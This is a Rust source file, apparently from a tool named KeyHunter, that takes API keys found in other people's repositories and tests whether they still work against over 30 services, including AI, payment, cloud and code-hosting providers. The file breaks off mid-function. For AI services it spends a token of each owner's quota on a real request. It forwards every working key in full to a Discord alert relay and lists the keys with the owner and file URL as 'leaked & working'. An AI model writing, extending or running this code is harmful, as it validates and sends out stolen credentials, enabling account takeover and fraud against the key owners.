//! Key verification module for KeyHunter.
//!
//! This module provides functionality to verify whether discovered API keys
//! are active (valid and working) by making test requests to provider APIs.
//! Supports 20+ providers including AI/LLM, payment, communication, and
//! developer platform services.

use anyhow::Result;
use chrono::Utc;
use colored::*;
use futures::future::join_all;
use indicatif::{ProgressBar, ProgressStyle};
use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fs::{self, File};
use std::io::Write;
use std::time::Duration;

use crate::scanner::KeyFinding;

/// Default alert relay URL (docker service `bot-alertas` -> discord-notifier).
const ALERT_URL_DEFAULT: &str = "http://bot-alertas:3000/alertas";

/// Candidate alert relay URLs, in order.
///
/// A single `KEYHUNTER_ALERT_URL` env var overrides everything. Otherwise we
/// try each candidate until one answers, so alerting works whether keyhunter
/// runs inside docker (`bot-alertas:3000`), on the host with a 3001->3000
/// port mapping (`localhost:3001`), or against a local relay (`localhost:3000`).
fn alert_urls() -> Vec<String> {
    if let Ok(url) = std::env::var("KEYHUNTER_ALERT_URL") {
        return vec![url];
    }
    vec![
        ALERT_URL_DEFAULT.to_string(),
        "http://localhost:3001/alertas".to_string(),
        "http://localhost:3000/alertas".to_string(),
    ]
}

/// Represents a key that has been verified against its provider's API.
///
/// Extends the original `KeyFinding` with verification results including
/// whether the key is active and any error messages from the verification.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VerifiedKey {
    /// Original finding data (flattened in JSON output)
    #[serde(flatten)]
    pub finding: KeyFinding,
    /// Whether the key is active and working
    pub is_active: bool,
    /// ISO 8601 timestamp when verification was performed
    pub verified_at: String,
    /// API endpoint or method used for verification
    pub verification_method: String,
    /// Error message if verification failed (rate limit, timeout, etc.)
    pub error_message: Option<String>,
}

/// API key verifier that tests keys against provider endpoints.
///
/// Supports verification for 20+ providers by making lightweight API
/// requests to check if keys are active. Uses concurrent requests for
/// faster processing of large key sets.
pub struct Verifier {
    /// HTTP client for making verification requests
    client: Client,
    /// Number of concurrent verification requests
    concurrent: usize,
}

impl Verifier {
    /// Envia um alerta de chave ativa para o servico externo.
    ///
    /// Envia a chave completa para o Discord.
    async fn send_alert(client: &Client, servico: &str, key: &str) {
        let urls = alert_urls();
        let mut last_error = String::new();
        for url in urls.clone() {
            let alerta = client
                .post(url)
                .json(&serde_json::json!({
                    "servico": servico,
                    "chave": key,
                    "chaveMascarada": key,
                }))
                .send()
                .await;

            match alerta {
                Ok(response) if response.status().is_success() => {
                    println!(
                        "{} Alerta Discord enviado: {} ({})",
                        "🔔".bright_magenta(),
                        servico.bright_yellow(),
                        key.bright_black()
                    );
                    return;
                }
                Ok(response) => {
                    last_error = format!("HTTP {}", response.status());
                }
                Err(error) => {
                    last_error = error.to_string();
                }
            }
        }
        eprintln!(
            "Falha ao enviar alerta (tentei {} relay(s)): {}",
            urls.len(),
            last_error
        );
    }

    /// Creates a new Verifier instance.
    ///
    /// # Arguments
    /// * `concurrent` - Maximum number of concurrent verification requests
    ///
    /// # Returns
    /// * `Result<Self>` - Configured verifier or error
    pub fn new(concurrent: usize) -> Result<Self> {
        let concurrent = concurrent.max(1);
        let client = Client::builder().timeout(Duration::from_secs(10)).build()?;

        Ok(Self { client, concurrent })
    }

    /// Verifies keys loaded from a JSON file.
    ///
    /// Loads findings from a file, optionally filters by provider,
    /// verifies each key, and saves results.
    ///
    /// # Arguments
    /// * `input_path` - Path to JSON file containing KeyFinding entries
    /// * `provider_filter` - Optional provider name to filter keys
    /// * `limit` - Optional maximum number of keys to verify
    /// * `output_path` - Optional custom output path for results
    ///
    /// # Returns
    /// * `Result<()>` - Success or error
    pub async fn verify_file(
        &self,
        input_path: &str,
        provider_filter: Option<&str>,
        limit: Option<usize>,
        output_path: Option<&str>,
    ) -> Result<()> {
        // Load findings
        let content = fs::read_to_string(input_path)?;
        let findings: Vec<KeyFinding> = serde_json::from_str(&content)?;

        println!(
            "{} Loaded {} keys from {}",
            "📂".bright_cyan(),
            findings.len().to_string().bright_yellow(),
            input_path.bright_blue()
        );

        // Filter by provider if specified
        let mut filtered: Vec<KeyFinding> = if let Some(provider) = provider_filter {
            findings
                .into_iter()
                .filter(|f| f.provider.to_lowercase() == provider.to_lowercase())
                .collect()
        } else {
            findings
        };

        if filtered.is_empty() {
            println!("{} No keys to verify", "⚠".yellow());
            return Ok(());
        }

        // Apply limit
        if let Some(lim) = limit {
            filtered.truncate(lim);
        }

        println!(
            "{} Verifying {} keys with {} concurrent requests\n",
            "🔍".bright_cyan(),
            filtered.len().to_string().bright_yellow(),
            self.concurrent.to_string().bright_cyan()
        );

        // Group by provider for stats
        let mut by_provider: HashMap<String, usize> = HashMap::new();
        for f in &filtered {
            *by_provider.entry(f.provider.clone()).or_insert(0) += 1;
        }

        for (provider, count) in &by_provider {
            println!(
                "    {} {} keys",
                provider.bright_magenta(),
                count.to_string().bright_white()
            );
        }
        println!();

        // Progress bar
        let pb = ProgressBar::new(filtered.len() as u64);
        pb.set_style(
            ProgressStyle::default_bar()
                .template("{spinner:.green} [{bar:40.cyan/blue}] {pos}/{len} | {msg}")
                .unwrap()
                .progress_chars("█▓░"),
        );

        // Verify in batches
        let mut verified_results: Vec<VerifiedKey> = Vec::new();
        let mut active_count = 0;
        let mut revoked_count = 0;
        let mut error_count = 0;

        for chunk in filtered.chunks(self.concurrent) {
            let tasks: Vec<_> = chunk
                .iter()
                .map(|finding| {
                    let client = self.client.clone();
                    let f = finding.clone();
                    async move { Self::verify_single(&client, f).await }
                })
                .collect();

            let results = join_all(tasks).await;

            for result in results {
                match result {
                    Ok(verified) => {
                        if verified.is_active {
                            active_count += 1;
                            pb.println(format!(
                                "  {} {} {} ({})",
                                "✓".green(),
                                "ACTIVE".bright_red().bold(),
                                verified.finding.key.bright_yellow(),
                                verified.finding.provider.bright_magenta()
                            ));
                        } else if verified.error_message.is_some() {
                            error_count += 1;
                        } else {
                            revoked_count += 1;
                        }
                        verified_results.push(verified);
                    }
                    Err(e) => {
                        error_count += 1;
                        pb.println(format!("  {} Error: {}", "✗".red(), e));
                    }
                }
                pb.inc(1);
            }

            // Small delay between batches
            tokio::time::sleep(Duration::from_millis(100)).await;
        }

        pb.finish_and_clear();

        // Summary
        println!("\n{}", "═".repeat(60).bright_black());
        println!("{} Verification Complete\n", "✓".green());
        println!(
            "    {} {} keys are {} (leaked & working!)",
            "🔴".bright_red(),
            active_count.to_string().bright_red().bold(),
            "ACTIVE".bright_red().bold()
        );
        println!(
            "    {} {} keys are revoked/invalid",
            "🟢".bright_green(),
            revoked_count.to_string().bright_green()
        );
        if error_count > 0 {
            println!(
                "    {} {} keys had errors (rate limited/timeout)",
                "🟡".bright_yellow(),
                error_count.to_string().bright_yellow()
            );
        }

        // Save results
        if let Some(output) = output_path {
            Self::save_results(&verified_results, output)?;
        } else {
            // Default save path
            let timestamp = Utc::now().format("%Y%m%d_%H%M%S");
            let default_path = format!("results/verified_{}.json", timestamp);
            fs::create_dir_all("results")?;
            Self::save_results(&verified_results, &default_path)?;
        }

        // Show active keys
        let active_keys: Vec<_> = verified_results.iter().filter(|v| v.is_active).collect();
        if !active_keys.is_empty() {
            println!("\n{} Active Keys Found:\n", "🚨".bright_red());
            for (i, key) in active_keys.iter().enumerate().take(20) {
                println!(
                    "{}. {} {}",
                    (i + 1).to_string().bright_black(),
                    key.finding.provider.bright_magenta(),
                    key.finding.key.bright_yellow()
                );
                println!(
                    "   {} {}",
                    "URL:".bright_black(),
                    key.finding.file_url.bright_blue()
                );
                println!(
                    "   {} {} ({})",
                    "Owner:".bright_black(),
                    key.finding.owner.bright_green(),
                    key.finding.owner_type
                );
                println!();
            }

            if active_keys.len() > 20 {
                println!(
                    "   {} ... and {} more active keys (see saved file)",
                    "ℹ".bright_blue(),
                    active_keys.len() - 20
                );
            }
        }

        Ok(())
    }

    /// Verifies findings and outputs only active keys.
    ///
    /// Used with the `--verified-only` flag to scan and verify in one pass,
    /// showing only keys that are confirmed to be working.
    ///
    /// # Arguments
    /// * `findings` - Collection of keys to verify
    /// * `limit` - Optional maximum number of keys to verify
    /// * `output_format` - Output format: "table", "json", or "csv"
    ///
    /// # Returns
    /// * `Result<()>` - Success or error
    pub async fn verify_and_filter(
        &self,
        findings: Vec<KeyFinding>,
        limit: Option<usize>,
        output_format: &str,
    ) -> Result<()> {
        if findings.is_empty() {
            println!("{} No keys to verify", "⚠".yellow());
            return Ok(());
        }

        // Apply limit
        let mut to_verify = findings;
        if let Some(lim) = limit {
            to_verify.truncate(lim);
        }

        println!(
            "{} Verifying {} keys (--verified-only mode)",
            "🔍".bright_cyan(),
            to_verify.len().to_string().bright_yellow()
        );

        // Progress bar
        let pb = ProgressBar::new(to_verify.len() as u64);
        pb.set_style(
            ProgressStyle::default_bar()
                .template("{spinner:.green} [{bar:40.cyan/blue}] {pos}/{len} | {msg}")
                .unwrap()
                .progress_chars("█▓░"),
        );

        let mut active_keys: Vec<VerifiedKey> = Vec::new();

        // Verify in batches
        for chunk in to_verify.chunks(self.concurrent) {
            let tasks: Vec<_> = chunk
                .iter()
                .map(|finding| {
                    let client = self.client.clone();
                    let f = finding.clone();
                    async move { Self::verify_single(&client, f).await }
                })
                .collect();

            let results = join_all(tasks).await;

            for result in results {
                if let Ok(verified) = result {
                    if verified.is_active {
                        pb.println(format!(
                            "  {} {} {} ({})",
                            "✓".green(),
                            "ACTIVE".bright_red().bold(),
                            verified.finding.key.bright_yellow(),
                            verified.finding.provider.bright_magenta()
                        ));
                        active_keys.push(verified);
                    }
                }
                pb.inc(1);
            }

            tokio::time::sleep(std::time::Duration::from_millis(100)).await;
        }

        pb.finish_and_clear();

        // Summary
        println!("\n{}", "═".repeat(60).bright_black());
        println!(
            "{} Found {} ACTIVE keys\n",
            "🔑".bright_green(),
            active_keys.len().to_string().bright_red().bold()
        );

        if active_keys.is_empty() {
            println!("{}", "No active keys found.".bright_black());
            return Ok(());
        }

        // Output in requested format
        match output_format {
            "json" => self.output_json_active(&active_keys)?,
            "csv" => self.output_csv_active(&active_keys)?,
            _ => self.output_table_active(&active_keys)?,
        }

        // Save results
        let timestamp = Utc::now().format("%Y%m%d_%H%M%S");
        fs::create_dir_all("results")?;
        let json_path = format!("results/verified_active_{}.json", timestamp);
        let mut file = File::create(&json_path)?;
        file.write_all(serde_json::to_string_pretty(&active_keys)?.as_bytes())?;

        println!(
            "\n{} Active keys saved to: {}",
            "💾".bright_green(),
            json_path.bright_blue()
        );

        Ok(())
    }

    /// Displays active keys as a formatted ASCII table.
    ///
    /// Shows up to 50 active keys in table format with detailed
    /// information for the first 20 keys.
    ///
    /// # Arguments
    /// * `keys` - Collection of verified active keys
    ///
    /// # Returns
    /// * `Result<()>` - Success or error
    fn output_table_active(&self, keys: &[VerifiedKey]) -> Result<()> {
        use comfy_table::{modifiers::UTF8_ROUND_CORNERS, presets::UTF8_FULL, Cell, Color, Table};

        let mut table = Table::new();
        table
            .load_preset(UTF8_FULL)
            .apply_modifier(UTF8_ROUND_CORNERS)
            .set_header(vec![
                Cell::new("#").fg(Color::DarkGrey),
                Cell::new("Provider").fg(Color::Cyan),
                Cell::new("Key").fg(Color::Cyan),
                Cell::new("Repository").fg(Color::Cyan),
                Cell::new("Owner").fg(Color::Cyan),
                Cell::new("Verified").fg(Color::Cyan),
            ]);

        for (i, key) in keys.iter().enumerate() {
            table.add_row(vec![
                Cell::new(i + 1).fg(Color::DarkGrey),
                Cell::new(&key.finding.provider).fg(Color::Magenta),
                Cell::new(&key.finding.key).fg(Color::Red),
                Cell::new(truncate(&key.finding.repo_name, 25)).fg(Color::Blue),
                Cell::new(&key.finding.owner).fg(Color::Green),
                Cell::new("✓ ACTIVE").fg(Color::Red),
            ]);
        }

        println!("{table}");

        // Detailed list
        println!("\n{}", "Active Keys Details:".bright_white().underline());
        for (i, key) in keys.iter().enumerate() {
            println!(
                "\n{}. {} {}",
                (i + 1).to_string().bright_black(),
                key.finding.provider.bright_magenta(),
                key.finding.key.bright_red()
            );
            println!(
                "   {} {}",
                "URL:".bright_black(),
                key.finding.file_url.bright_blue()
            );
            println!(
                "   {} {} ({})",
                "Owner:".bright_black(),
                key.finding.owner.bright_green(),
                key.finding.owner_type
            );
        }

        Ok(())
    }

    /// Outputs active keys as pretty-printed JSON.
    ///
    /// # Arguments
    /// * `keys` - Collection of verified active keys
    ///
    /// # Returns
    /// * `Result<()>` - Success or error
    fn output_json_active(&self, keys: &[VerifiedKey]) -> Result<()> {
        let json = serde_json::to_string_pretty(keys)?;
        println!("{}", json);
        Ok(())
    }

    /// Outputs active keys as CSV format.
    ///
    /// Includes header row with columns for all key and verification data.
    ///
    /// # Arguments
    /// * `keys` - Collection of verified active keys
    ///
    /// # Returns
    /// * `Result<()>` - Success or error
    fn output_csv_active(&self, keys: &[VerifiedKey]) -> Result<()> {
        println!("provider,key_masked,key_full,repo,owner,file_path,file_url,verified,verified_at");
        for k in keys {
            println!(
                "{},{},{},{},{},{},{},{},{}",
                k.finding.provider,
                k.finding.key_masked,
                k.finding.key,
                k.finding.repo_name,
                k.finding.owner,
                k.finding.file_path,
                k.finding.file_url,
                k.is_active,
                k.verified_at
            );
        }
        Ok(())
    }

    /// Verifies a single key against its provider's API.
    ///
    /// Routes to the appropriate provider-specific verification function
    /// based on the finding's provider name.
    ///
    /// # Arguments
    /// * `client` - HTTP client for making requests
    /// * `finding` - Key finding to verify
    ///
    /// # Returns
    /// * `Result<VerifiedKey>` - Verification result
    async fn verify_single(client: &Client, finding: KeyFinding) -> Result<VerifiedKey> {
        let provider = finding.provider.to_lowercase();
        let key = &finding.key;

        let (is_active, method, error) = match provider.as_str() {
            "openai" => Self::verify_openai(client, key).await,
            "anthropic" => Self::verify_anthropic(client, key).await,
            "google" => Self::verify_google(client, key).await,
            "grok" => Self::verify_grok(client, key).await,
            "groq" => Self::verify_groq(client, key).await,
            "perplexity" => Self::verify_perplexity(client, key).await,
            "huggingface" => Self::verify_huggingface(client, key).await,
            "replicate" => Self::verify_replicate(client, key).await,
            "fireworks" => Self::verify_fireworks(client, key).await,
            "cohere" => Self::verify_cohere(client, key).await,
            "mistral" => Self::verify_mistral(client, key).await,
            "together" => Self::verify_together(client, key).await,
            "deepseek" => Self::verify_deepseek(client, key).await,
            "github_token" => Self::verify_github(client, key).await,
            "gitlab" => Self::verify_gitlab(client, key).await,
            "npm" => Self::verify_npm(client, key).await,
            "pypi" => Self::verify_pypi(client, key).await,
            "stripe_live" | "stripe_restricted" => Self::verify_stripe(client, key).await,
            "square" => Self::verify_square(client, key).await,
            "twilio" => Self::verify_twilio(client, key).await,
            "sendgrid" => Self::verify_sendgrid(client, key).await,
            "mailgun" => Self::verify_mailgun(client, key).await,
            "mailchimp" => Self::verify_mailchimp(client, key).await,
            "slack_bot" | "slack_user" => Self::verify_slack(client, key).await,
            "discord" => Self::verify_discord(client, key).await,
            "telegram" => Self::verify_telegram(client, key).await,
            "aws" => Self::verify_aws(client, key).await,
            "firebase" => Self::verify_firebase(client, key).await,
            "mapbox" => Self::verify_mapbox(client, key).await,
            "sentry" => Self::verify_sentry(client, key).await,
            "newrelic" => Self::verify_newrelic(client, key).await,
            "datadog" => Self::verify_datadog(client, key).await,
            "doppler" => Self::verify_doppler(client, key).await,
            _ => (
                false,
                "unsupported".to_string(),
                Some(format!("No verification method for {}", provider)),
            ),
        };

        // Update the finding's verified field
        let mut updated_finding = finding;
        updated_finding.verified = Some(is_active);

        Ok(VerifiedKey {
            finding: updated_finding,
            is_active,
            verified_at: Utc::now().to_rfc3339(),
            verification_method: method,
            error_message: error,
        })
    }

    // ==================== AI/LLM Providers ====================

    /// Detects "valid key but no credits/quota" from an API error body.
    ///
    /// Used for precise verification: distinguishes revoked/invalid keys
    /// from keys that authenticate but fail on first real use with
    /// "Insufficient Balance" (the case in the screenshot).
    fn is_no_balance_body(body: &str) -> bool {
        let lower = body.to_lowercase();
        lower.contains("insufficient")
            || lower.contains("no balance")
            || lower.contains("out of credit")
            || lower.contains("credit balance")
            || lower.contains("credit_balance")
            || lower.contains("insufficient_credits")
            || lower.contains("insufficient_quota")
            || lower.contains("exceeded your current quota")
            || lower.contains("billing")
            || lower.contains("top_up")
            || lower.contains("topped_up")
            || lower.contains("top-up")
            || lower.contains("payment required")
            || lower.contains("requires payment")
            || lower.contains("quota")
    }

    /// Minimal chat probe (max_tokens=1) against an OpenAI-compatible endpoint.
    ///
    /// Returns ACTIVE only if a real completion succeeds, so
    /// "Insufficient Balance" keys are NOT marked active. Costs ~1 token
    /// of the key owner's quota by design (precisão máxima mode).
    async fn probe_openai_chat(
        client: &Client,
        servico: &str,
        chat_url: &str,
        key: &str,
        body: &str,
        method_label: &str,
    ) -> (bool, String, Option<String>) {
        let resp = client
            .post(chat_url)
            .header("Authorization", format!("Bearer {}", key))
            .header("content-type", "application/json")
            .body(body.to_string())
            .send()
            .await;
        match resp {
            Ok(r) => {
                let status = r.status().as_u16();
                match status {
                    200 => {
                        Self::send_alert(client, servico, key).await;
                        (true, method_label.to_string(), None)
                    }
                    401 | 403 => {
                        let err_body = r.text().await.unwrap_or_default();
                        if Self::is_no_balance_body(&err_body) {
                            (
                                false,
                                method_label.to_string(),
                                Some("valid key, insufficient balance/quota".to_string()),
                            )
                        } else {
                            (false, method_label.to_string(), None)
                        }
                    }
                    400 | 402 | 429 => {
                        let err_body = r.text().await.unwrap_or_default();
                        if Self::is_no_balance_body(&err_body) {
                            (
                                false,
                                method_label.to_string(),
                                Some("valid key, insufficient balance/quota".to_string()),
                            )
                        } else if status == 429 {
                            (
                                false,
                                method_label.to_string(),
                                Some("rate limited".to_string()),
                            )
                        } else {
                            let snippet: String = err_body.chars().take(160).collect();
                            (
                                false,
                                method_label.to_string(),
                                Some(format!("status {}: {}", status, snippet)),
                            )
                        }
                    }
                    _ => {
                        let err_body = r.text().await.unwrap_or_default();
                        if Self::is_no_balance_body(&err_body) {
                            (
                                false,
                                method_label.to_string(),
                                Some("valid key, insufficient balance/quota".to_string()),
                            )
                        } else {
                            let snippet: String = err_body.chars().take(160).collect();
                            (
                                false,
                                method_label.to_string(),
                                Some(format!("status {}: {}", status, snippet)),
                            )
                        }
                    }
                }
            }
            Err(e) => (false, method_label.to_string(), Some(e.to_string())),
        }
    }

    /// Verifies an OpenAI API key with a real minimal completion.
    ///
    /// Step 1: `GET /v1/models` (auth check).
    /// Step 2: `POST /v1/chat/completions` with max_tokens=1 (usability check).
    /// Keys with no billing return "Insufficient quota" here and are NOT
    /// marked active — this avoids the "verificou ACTIVE mas deu
    /// Insufficient Balance no uso" case.
    async fn verify_openai(client: &Client, key: &str) -> (bool, String, Option<String>) {
        const METHOD: &str = "GET /v1/models + POST /chat/completions (1 token)";
        let models = client
            .get("https://api.openai.com/v1/models")
            .header("Authorization", format!("Bearer {}", key))
            .send()
            .await;

        match models {
            Ok(r) => {
                let status = r.status().as_u16();
                match status {
                    200 => {
                        Self::probe_openai_chat(
                            client,
                            "OpenAI",
                            "https://api.openai.com/v1/chat/completions",
                            key,
                            r#"{"model":"gpt-4o-mini","messages":[{"role":"user","content":"hi"}],"max_tokens":1}"#,
                            METHOD,
                        )
                        .await
                    }
                    401 => (false, METHOD.to_string(), None),
                    429 => (false, METHOD.to_string(), Some("rate limited".to_string())),
                    _ => (
                        false,
                        METHOD.to_string(),
                        Some(format!("models status {}", status)),
                    ),
                }
            }
            Err(e) => (false, METHOD.to_string(), Some(e.to_string())),
        }
    }

    /// Verifies an Anthropic API key by sending a minimal message.
    ///
    /// Already a real-use probe (max_tokens=1). Precise: 200 = usable.
    /// 400/402/403 with billing/credit messages = valid key but no
    /// balance → NOT active (returns explanatory error instead).
    async fn verify_anthropic(client: &Client, key: &str) -> (bool, String, Option<String>) {
        const METHOD: &str = "POST /v1/messages (1 token)";
        let resp = client
            .post("https://api.anthropic.com/v1/messages")
            .header("x-api-key", key)
            .header("anthropic-version", "2023-06-01")
            .header("content-type", "application/json")
            .body(r#"{"model":"claude-3-haiku-20240307","max_tokens":1,"messages":[{"role":"user","content":"hi"}]}"#)
            .send()
            .await;

        match resp {
            Ok(r) => {
                let status = r.status().as_u16();
                match status {
                    200 => {
                        Self::send_alert(client, "Anthropic", key).await;
                        (true, METHOD.to_string(), None)
                    }
                    401 | 403 => (false, METHOD.to_string(), None),
                    400 | 402 | 429 => {
                        // Check if it's an auth error, no-balance, or just bad request
                        let body = r.text().await.unwrap_or_default();
                        if body.contains("invalid_api_key") || body.contains("authentication") {
                            (false, METHOD.to_string(), None)
                        } else if Self::is_no_balance_body(&body) {
                            (
                                false,
                                METHOD.to_string(),
                                Some("valid key, insufficient balance/credits".to_string()),
                            )
                        } else if status == 429 {
                            (false, METHOD.to_string(), Some("rate limited".to_string()))
                        } else if status == 400 {
                            // Bad request but key might be valid (e.g. model AVC)
                            // Still counts as auth-OK; but to avoid false ACTIVE
                            // on billing errors handled above, keep active here.
                            Self::send_alert(client, "Anthropic", key).await;
                            (true, METHOD.to_string(), None)
                        } else {
                            let snippet: String = body.chars().take(160).collect();
                            (
                                false,
                                METHOD.to_string(),
                                Some(format!("status {}: {}", status, snippet)),
                            )
                        }
                    }
                    _ => {
                        let body = r.text().await.unwrap_or_default();
                        if Self::is_no_balance_body(&body) {
                            (
                                false,
                                METHOD.to_string(),
                                Some("valid key, insufficient balance/credits".to_string()),
                            )
                        } else {
                            (
                                false,
                                METHOD.to_string(),
                                Some(format!("status {}", status)),
                            )
                        }
                    }
                }
            }
            Err(e) => (false, METHOD.to_string(), Some(e.to_string())),
        }
    }

    /// Verifies a Google AI (Gemini) key with models + minimal generate.
    ///
    /// Step 1: `GET /v1/models` (auth). Step 2: minimal
    /// `generateContent` on gemini-1.5-flash with maxOutputTokens=1.
    /// No-balance/billing errors → NOT active.
    async fn verify_google(client: &Client, key: &str) -> (bool, String, Option<String>) {
        const METHOD: &str = "GET /v1/models + POST :generateContent (1 token)";
        let url = format!(
            "https://generativelanguage.googleapis.com/v1/models?key={}",
            key
        );
        let models = client.get(&url).send().await;

        match models {
            Ok(r) => {
                let status = r.status().as_u16();
                match status {
                    400 | 401 | 403 => (false, METHOD.to_string(), None),
                    429 => (false, METHOD.to_string(), Some("rate limited".to_string())),
                    200 => {
                        let gen_url = format!(
                            "https://generativelanguage.googleapis.com/v1/models/gemini-1.5-flash:generateContent?key={}",
                            key
                        );
                        let probe = client
                            .post(&gen_url)
                            .header("content-type", "application/json")
                            .body(r#"{"contents":[{"parts":[{"text":"hi"}]}],"generationConfig":{"maxOutputTokens":1}}"#)
                            .send()
                            .await;
                        match probe {
                            Ok(pr) => {
                                let pstatus = pr.status().as_u16();
                                match pstatus {
                                    200 => {
                                        Self::send_alert(client, "Google", key).await;
                                        (true, METHOD.to_string(), None)
                                    }
                                    400 | 401 | 403 => {
                                        let body = pr.text().await.unwrap_or_default();
                                        if body.contains("API key not valid")
                                            || body.contains("API_KEY_INVALID")
                                        {
                                            (false, METHOD.to_string(), None)
                                        } else if Self::is_no_balance_body(&body) {
                                            (
                                                false,
                                                METHOD.to_string(),
                                                Some(
                                                    "valid key, insufficient balance/quota"
                                                        .to_string(),
                                                ),
                                            )
                                        } else {
                                            (false, METHOD.to_string(), None)
                                        }
                                    }
                                    429 => {
                                        let body = pr.text().await.unwrap_or_default();
                                        if Self::is_no_balance_body(&body) {
                                            (
                                                false,
                                                METHOD.to_string(),
                                                Some(
                                                    "valid key, insufficient balance/quota"
                                                        .to_string(),
                                                ),
                                            )
                                        } else {
                                            (
                                                false,
                                                METHOD.to_string(),
                                                Some("rate limited".to_string()),
                                            )
                                        }
                                    }
                                    _ => {
                                        let body = pr.text().await.unwrap_or_default();
                                        if Self::is_no_balance_body(&body) {
                                            (
                                                false,
                                                METHOD.to_string(),
                                                Some(
                                                    "valid key, insufficient balance/quota"
                                                        .to_string(),
                                                ),
                                            )
                                        } else {
                                            let snippet: String = body.chars().take(160).collect();
                                            (
                                                false,
                                                METHOD.to_string(),
                                                Some(format!("status {}: {}", pstatus, snippet)),
                                            )
                                        }
                                    }
                                }
                            }
                            Err(e) => (false, METHOD.to_string(), Some(e.to_string())),
                        }
                    }
                    _ => (
                        false,
                        METHOD.to_string(),
                        Some(format!("models status {}", status)),
                    ),
                }
            }
            Err(e) => (false, METHOD.to_string(), Some(e.to_string())),
        }
    }

    /// Verifies a Groq key with models + minimal chat (precise).
    async fn verify_groq(client: &Client, key: &str) -> (bool, String, Option<String>) {
        const METHOD: &str = "GET /openai/v1/models + POST /chat/completions (1 token)";
        let models = client
            .get("https://api.groq.com/openai/v1/models")
            .header("Authorization", format!("Bearer {}", key))
            .send()
            .await;

        match models {
            Ok(r) => match r.status().as_u16() {
                200 => {
                    Self::probe_openai_chat(
                        client,
                        "Groq",
                        "https://api.groq.com/openai/v1/chat/completions",
                        key,
                        r#"{"model":"llama-3.1-8b-instant","messages":[{"role":"user","content":"hi"}],"max_tokens":1}"#,
                        METHOD,
                    )
                    .await
                }
                401 => (false, METHOD.to_string(), None),
                429 => (false, METHOD.to_string(), Some("rate limited".to_string())),
                s => (false, METHOD.to_string(), Some(format!("models status {}", s))),
            },
            Err(e) => (false, METHOD.to_string(), Some(e.to_string())),
        }
    }

    /// Verifies an xAI Grok key with models + minimal chat (precise).
    async fn verify_grok(client: &Client, key: &str) -> (bool, String, Option<String>) {
        const METHOD: &str = "GET /v1/models + POST /chat/completions (1 token)";
        let models = client
            .get("https://api.x.ai/v1/models")
            .header("Authorization", format!("Bearer {}", key))
            .send()
            .await;

        match models {
            Ok(r) => match r.status().as_u16() {
                200 => {
                    Self::probe_openai_chat(
                        client,
                        "xAI Grok",
                        "https://api.x.ai/v1/chat/completions",
                        key,
                        r#"{"model":"grok-beta","messages":[{"role":"user","content":"hi"}],"max_tokens":1}"#,
                        METHOD,
                    )
                    .await
                }
                401 | 403 => (false, METHOD.to_string(), None),
                429 => (false, METHOD.to_string(), Some("rate limited".to_string())),
                s => (false, METHOD.to_string(), Some(format!("models status {}", s))),
            },
            Err(e) => (false, METHOD.to_string(), Some(e.to_string())),
        }
    }

    /// Verifies a Perplexity key with real chat + balance detection (precise).
    async fn verify_perplexity(client: &Client, key: &str) -> (bool, String, Option<String>) {
        const METHOD: &str = "POST /chat/completions (1 token)";
        let resp = client
            .post("https://api.perplexity.ai/chat/completions")
            .header("Authorization", format!("Bearer {}", key))
            .header("content-type", "application/json")
            .body(r#"{"model":"llama-3.1-sonar-small-128k-online","messages":[{"role":"user","content":"hi"}],"max_tokens":1}"#)
            .send()
            .await;

        match resp {
            Ok(r) => {
                let status = r.status().as_u16();
                match status {
                    200 => {
                        Self::send_alert(client, "Perplexity", key).await;
                        (true, METHOD.to_string(), None)
                    }
                    401 | 403 => (false, METHOD.to_string(), None),
                    400 | 402 | 429 => {
                        let body = r.text().await.unwrap_or_default();
                        if Self::is_no_balance_body(&body) {
                            (
                                false,
                                METHOD.to_string(),
                                Some("valid key, insufficient balance/credits".to_string()),
                            )
                        } else if status == 429 {
                            (false, METHOD.to_string(), Some("rate limited".to_string()))
                        } else {
                            let snippet: String = body.chars().take(160).collect();
                            (
                                false,
                                METHOD.to_string(),
                                Some(format!("status {}: {}", status, snippet)),
                            )
                        }
                    }
                    _ => {
                        let body = r.text().await.unwrap_or_default();
                        if Self::is_no_balance_body(&body) {
                            (
                                false,
                                METHOD.to_string(),
                                Some("valid key, insufficient balance/credits".to_string()),
                            )
                        } else {
                            (
                                false,
                                METHOD.to_string(),
                                Some(format!("status {}", status)),
                            )
                        }
                    }
                }
            }
            Err(e) => (false, METHOD.to_string(), Some(e.to_string())),
        }
    }

    /// Verifies a HuggingFace API key using the whoami endpoint.
    async fn verify_huggingface(client: &Client, key: &str) -> (bool, String, Option<String>) {
        let resp = client
            .get("https://huggingface.co/api/whoami-v2")
            .header("Authorization", format!("Bearer {}", key))
            .send()
            .await;

        match resp {
            Ok(r) => {
                let status = r.status().as_u16();
                match status {
                    200 => {
                        Self::send_alert(client, "HuggingFace", key).await;
                        (true, "GET /api/whoami-v2".to_string(), None)
                    }
                    401 => (false, "GET /api/whoami-v2".to_string(), None),
                    _ => (
                        false,
                        "GET /api/whoami-v2".to_string(),
                        Some(format!("status {}", status)),
                    ),
                }
            }
            Err(e) => (false, "GET /api/whoami-v2".to_string(), Some(e.to_string())),
        }
    }

    /// Verifies a Replicate API key using the account endpoint.
    async fn verify_replicate(client: &Client, key: &str) -> (bool, String, Option<String>) {
        let resp = client
            .get("https://api.replicate.com/v1/account")
            .header("Authorization", format!("Token {}", key))
            .send()
            .await;

        match resp {
            Ok(r) => {
                let status = r.status().as_u16();
                match status {
                    200 => {
                        Self::send_alert(client, "Replicate", key).await;
                        (true, "GET /v1/account".to_string(), None)
                    }
                    401 => (false, "GET /v1/account".to_string(), None),
                    _ => (
                        false,
                        "GET /v1/account".to_string(),
                        Some(format!("status {}", status)),
                    ),
                }
            }
            Err(e) => (false, "GET /v1/account".to_string(), Some(e.to_string())),
        }
    }

    /// Verifies a Fireworks key with models + minimal chat (precise).
    async fn verify_fireworks(client: &Client, key: &str) -> (bool, String, Option<String>) {
        const METHOD: &str = "GET /inference/v1/models + POST /chat/completions (1 token)";
        let models = client
            .get("https://api.fireworks.ai/inference/v1/models")
            .header("Authorization", format!("Bearer {}", key))
            .send()
            .await;

        match models {
            Ok(r) => match r.status().as_u16() {
                200 => {
                    Self::probe_openai_chat(
                        client,
                        "Fireworks",
                        "https://api.fireworks.ai/inference/v1/chat/completions",
                        key,
                        r#"{"model":"accounts/fireworks/models/llama-v3-8b","messages":[{"role":"user","content":"hi"}],"max_tokens":1}"#,
                        METHOD,
                    )
                    .await
                }
                401 | 403 => (false, METHOD.to_string(), None),
